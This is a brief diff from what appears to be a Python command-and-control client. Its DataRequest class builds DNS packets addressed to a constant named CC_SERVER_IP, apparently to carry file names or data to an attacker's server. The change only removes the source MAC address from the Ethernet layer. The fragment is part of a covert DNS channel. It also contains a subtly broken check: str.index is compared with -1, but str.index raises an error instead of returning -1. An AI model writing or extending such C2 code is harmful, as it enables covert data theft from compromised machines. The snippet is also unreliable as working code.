@@ -21,7 +21,7 @@ class DataRequest:
         reformatted_filename = "." + self.filename + ("." if self.filename.index('.') == -1 else "")
         mac_addr = ''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2)).lower() 
 
-        ether = Ether(src=mac_addr)
+        ether = Ether()
         ip = IP(dst=CC_SERVER_IP)
         udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
         dns = DNS(
